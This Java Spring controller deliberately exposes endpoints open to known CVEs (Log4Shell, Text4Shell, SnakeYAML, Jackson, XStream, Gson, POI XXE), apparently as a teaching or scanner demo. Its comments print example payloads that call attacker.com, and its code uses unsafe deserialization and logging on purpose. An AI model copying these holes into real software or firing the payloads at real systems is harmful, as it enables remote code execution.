package com.example.demo.controller;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.google.gson.JsonParser;
import com.thoughtworks.xstream.XStream;
import org.apache.commons.text.StringSubstitutor;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;
import org.yaml.snakeyaml.Yaml;

import java.io.InputStream;
import java.util.HashMap;
import java.util.Map;

/**
 * VULNERABLE CONTROLLER - FOR DEMONSTRATION PURPOSES ONLY
 * 
 * This controller demonstrates vulnerabilities from transitive dependencies
 * in the java-dependency-library-project. These endpoints should NEVER be
 * used in production code.
 */
@RestController
@RequestMapping("/api/vulnerable")
public class VulnerableDemoController {

    // Log4j logger - vulnerable to Log4Shell (CVE-2021-44228) via transitive dependency
    private static final Logger log4jLogger = LogManager.getLogger(VulnerableDemoController.class);

    /**
     * VULNERABLE: Log4Shell (CVE-2021-44228)
     * 
     * This endpoint logs user input directly, which can trigger JNDI lookup
     * in vulnerable Log4j versions (< 2.17.0).
     * 
     * Example exploit payload: ${jndi:ldap://attacker.com/exploit}
     * 
     * The vulnerability comes from log4j-core 2.14.1 in java-dependency-library-project
     */
    @GetMapping("/log4shell")
    public ResponseEntity<Map<String, String>> log4shell(@RequestParam String message) {
        Map<String, String> response = new HashMap<>();
        
        // VULNERABLE: User input logged directly - can trigger JNDI lookup
        log4jLogger.info("User message: {}", message);
        
        response.put("status", "logged");
        response.put("message", "Your message was logged: " + message);
        response.put("vulnerability", "CVE-2021-44228 (Log4Shell)");
        response.put("source", "Transitive dependency: log4j-core 2.14.1 from java-dependency-library-project");
        
        return ResponseEntity.ok(response);
    }

    /**
     * VULNERABLE: Text4Shell (CVE-2022-42889)
     * 
     * Apache Commons Text StringSubstitutor can execute arbitrary code
     * through script, DNS, and URL lookups when processing untrusted input.
     * 
     * Example exploit payloads:
     * - ${script:javascript:java.lang.Runtime.getRuntime().exec('calc')}
     * - ${url:UTF-8:https://attacker.com/}
     * - ${dns:address|attacker.com}
     * 
     * The vulnerability comes from commons-text 1.9 in java-dependency-library-project
     */
    @PostMapping("/text4shell")
    public ResponseEntity<Map<String, String>> text4shell(@RequestBody Map<String, String> input) {
        Map<String, String> response = new HashMap<>();
        
        String template = input.getOrDefault("template", "Hello ${name}!");
        String name = input.getOrDefault("name", "World");
        
        // VULNERABLE: StringSubstitutor with default interpolators allows code execution
        StringSubstitutor substitutor = StringSubstitutor.createInterpolator();
        substitutor.setEnableSubstitutionInVariables(true);
        
        Map<String, String> values = new HashMap<>();
        values.put("name", name);
        
        // This can execute malicious lookups if template contains exploit payloads
        String result = substitutor.replace(template);
        
        response.put("result", result);
        response.put("vulnerability", "CVE-2022-42889 (Text4Shell)");
        response.put("source", "Transitive dependency: commons-text 1.9 from java-dependency-library-project");
        
        return ResponseEntity.ok(response);
    }

    /**
     * VULNERABLE: SnakeYAML Unsafe Deserialization (CVE-2022-1471)
     * 
     * SnakeYAML by default allows deserialization of arbitrary Java objects,
     * which can lead to Remote Code Execution.
     * 
     * Example exploit payload:
     * !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/"]]]]
     * 
     * The vulnerability comes from snakeyaml 1.30 in java-dependency-library-project
     */
    @PostMapping("/yaml-deserialize")
    public ResponseEntity<Map<String, Object>> yamlDeserialize(@RequestBody String yamlContent) {
        Map<String, Object> response = new HashMap<>();
        
        // VULNERABLE: Unsafe YAML deserialization with default constructor
        // allows arbitrary object instantiation
        Yaml yaml = new Yaml();
        
        try {
            // This can instantiate arbitrary Java objects from YAML
            Object parsed = yaml.load(yamlContent);
            response.put("parsed", parsed != null ? parsed.toString() : "null");
            response.put("type", parsed != null ? parsed.getClass().getName() : "null");
        } catch (Exception e) {
            response.put("error", e.getMessage());
        }
        
        response.put("vulnerability", "CVE-2022-1471 (SnakeYAML RCE)");
        response.put("source", "Transitive dependency: snakeyaml 1.30 from java-dependency-library-project");
        
        return ResponseEntity.ok(response);
    }

    /**
     * VULNERABLE: Jackson Unsafe Deserialization (CVE-2020-24750 and others)
     * 
     * Jackson with default typing enabled can deserialize malicious payloads
     * that lead to Remote Code Execution.
     * 
     * The vulnerability comes from jackson-databind 2.9.8 in java-dependency-library-project
     */
    @PostMapping("/jackson-deserialize")
    public ResponseEntity<Map<String, Object>> jacksonDeserialize(@RequestBody String jsonContent) {
        Map<String, Object> response = new HashMap<>();
        
        // VULNERABLE: ObjectMapper with default typing allows gadget chain attacks
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping(); // This is the vulnerable configuration
        
        try {
            Object parsed = mapper.readValue(jsonContent, Object.class);
            response.put("parsed", parsed != null ? parsed.toString() : "null");
            response.put("type", parsed != null ? parsed.getClass().getName() : "null");
        } catch (Exception e) {
            response.put("error", e.getMessage());
        }
        
        response.put("vulnerability", "CVE-2020-24750 (Jackson Deserialization)");
        response.put("source", "Transitive dependency: jackson-databind 2.9.8 from java-dependency-library-project");
        
        return ResponseEntity.ok(response);
    }

    /**
     * VULNERABLE: XStream Unsafe Deserialization (CVE-2021-39144)
     * 
     * XStream can deserialize arbitrary XML into Java objects, allowing
     * Remote Code Execution through gadget chains.
     * 
     * Example exploit payload (simplified):
     * <java.util.PriorityQueue>...</java.util.PriorityQueue>
     * 
     * The vulnerability comes from xstream 1.4.17 in java-dependency-library-project
     */
    @PostMapping(value = "/xstream-deserialize", consumes = MediaType.APPLICATION_XML_VALUE)
    public ResponseEntity<Map<String, Object>> xstreamDeserialize(@RequestBody String xmlContent) {
        Map<String, Object> response = new HashMap<>();
        
        // VULNERABLE: XStream with no security configuration allows arbitrary object creation
        XStream xstream = new XStream();
        
        try {
            // This can instantiate arbitrary Java objects from XML
            Object parsed = xstream.fromXML(xmlContent);
            response.put("parsed", parsed != null ? parsed.toString() : "null");
            response.put("type", parsed != null ? parsed.getClass().getName() : "null");
        } catch (Exception e) {
            response.put("error", e.getMessage());
        }
        
        response.put("vulnerability", "CVE-2021-39144 (XStream RCE)");
        response.put("source", "Transitive dependency: xstream 1.4.17 from java-dependency-library-project");
        
        return ResponseEntity.ok(response);
    }

    /**
     * VULNERABLE: Gson DoS via Deeply Nested JSON (CVE-2022-25647)
     * 
     * Gson is vulnerable to Denial of Service when parsing deeply nested JSON
     * structures, causing stack overflow.
     * 
     * Example exploit: {"a":{"a":{"a":{"a":...}}}} (deeply nested ~10000 levels)
     * 
     * The vulnerability comes from gson 2.8.5 in java-dependency-library-project
     */
    @PostMapping("/gson-parse")
    public ResponseEntity<Map<String, Object>> gsonParse(@RequestBody String jsonContent) {
        Map<String, Object> response = new HashMap<>();
        
        // VULNERABLE: Gson parsing deeply nested JSON can cause stack overflow DoS
        try {
            // This can cause StackOverflowError with deeply nested JSON
            Object parsed = JsonParser.parseString(jsonContent);
            response.put("parsed", parsed != null ? parsed.toString().substring(0, Math.min(100, parsed.toString().length())) : "null");
            response.put("type", parsed != null ? parsed.getClass().getName() : "null");
        } catch (StackOverflowError e) {
            response.put("error", "StackOverflowError - DoS triggered!");
        } catch (Exception e) {
            response.put("error", e.getMessage());
        }
        
        response.put("vulnerability", "CVE-2022-25647 (Gson DoS)");
        response.put("source", "Transitive dependency: gson 2.8.5 from java-dependency-library-project");
        
        return ResponseEntity.ok(response);
    }

    /**
     * VULNERABLE: Apache POI XXE Injection (CVE-2019-12415)
     * 
     * Apache POI can be exploited via XXE (XML External Entity) injection
     * when parsing malicious Excel files, allowing file disclosure or SSRF.
     * 
     * The vulnerability comes from poi-ooxml 4.1.0 in java-dependency-library-project
     */
    @PostMapping(value = "/poi-upload", consumes = MediaType.MULTIPART_FORM_DATA_VALUE)
    public ResponseEntity<Map<String, Object>> poiUpload(@RequestParam("file") MultipartFile file) {
        Map<String, Object> response = new HashMap<>();
        
        try (InputStream is = file.getInputStream()) {
            // VULNERABLE: POI parsing can be exploited via XXE in malicious XLSX files
            XSSFWorkbook workbook = new XSSFWorkbook(is);
            
            response.put("sheets", workbook.getNumberOfSheets());
            response.put("firstSheetName", workbook.getSheetAt(0).getSheetName());
            workbook.close();
        } catch (Exception e) {
            response.put("error", e.getMessage());
        }
        
        response.put("vulnerability", "CVE-2019-12415 (Apache POI XXE)");
        response.put("source", "Transitive dependency: poi-ooxml 4.1.0 from java-dependency-library-project");
        
        return ResponseEntity.ok(response);
    }

    /**
     * Info endpoint - lists all vulnerable endpoints and their CVEs
     */
    @GetMapping("/info")
    public ResponseEntity<Map<String, Object>> info() {
        Map<String, Object> response = new HashMap<>();
        
        response.put("warning", "These endpoints demonstrate vulnerabilities from transitive dependencies");
        response.put("source_library", "java-dependency-library-project");
        
        Map<String, String> endpoints = new HashMap<>();
        endpoints.put("GET /api/vulnerable/log4shell?message={input}", "CVE-2021-44228 - Log4Shell (Critical RCE)");
        endpoints.put("POST /api/vulnerable/text4shell", "CVE-2022-42889 - Text4Shell (Critical RCE)");
        endpoints.put("POST /api/vulnerable/yaml-deserialize", "CVE-2022-1471 - SnakeYAML RCE");
        endpoints.put("POST /api/vulnerable/jackson-deserialize", "CVE-2020-24750 - Jackson Deserialization");
        endpoints.put("POST /api/vulnerable/xstream-deserialize", "CVE-2021-39144 - XStream RCE");
        endpoints.put("POST /api/vulnerable/gson-parse", "CVE-2022-25647 - Gson DoS");
        endpoints.put("POST /api/vulnerable/poi-upload", "CVE-2019-12415 - Apache POI XXE");
        
        response.put("endpoints", endpoints);
        
        Map<String, String> transitiveDeps = new HashMap<>();
        transitiveDeps.put("log4j-core", "2.14.1");
        transitiveDeps.put("commons-text", "1.9");
        transitiveDeps.put("snakeyaml", "1.30");
        transitiveDeps.put("jackson-databind", "2.9.8");
        transitiveDeps.put("xstream", "1.4.17");
        transitiveDeps.put("gson", "2.8.5");
        transitiveDeps.put("poi-ooxml", "4.1.0");
        
        response.put("vulnerable_transitive_dependencies", transitiveDeps);
        
        return ResponseEntity.ok(response);
    }
}
